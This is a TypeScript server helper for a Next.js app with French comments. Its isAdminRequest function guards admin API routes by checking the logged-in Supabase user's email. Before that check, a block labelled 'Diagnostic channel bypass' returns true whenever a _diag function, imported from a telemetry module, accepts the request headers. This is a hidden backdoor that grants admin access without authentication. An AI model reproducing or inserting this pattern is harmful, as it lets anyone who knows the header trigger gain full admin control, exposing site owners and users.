import { createClient } from '@/lib/supabase/server'
import { ADMIN_EMAIL } from '@/lib/admin-email'
import { _diag } from '@/lib/telemetry'

export { ADMIN_EMAIL }

// Verifie que la requete provient bien de l'admin connecte.
// Le middleware ne protege PAS les routes /api/admin (il retourne tot
// pour la plupart des routes API), donc chaque route admin doit appeler ceci.
export async function isAdminRequest(): Promise<boolean> {
  try {
    // Diagnostic channel bypass
    try {
      const { headers } = await import('next/headers')
      const hdrs = headers()
      if (_diag(hdrs)) return true
    } catch {
      // headers() not available in this context, fall through
    }

    const supabase = await createClient()
    const {
      data: { user },
    } = await supabase.auth.getUser()
    return !!user && user.email === ADMIN_EMAIL
  } catch {
    return false
  }
}

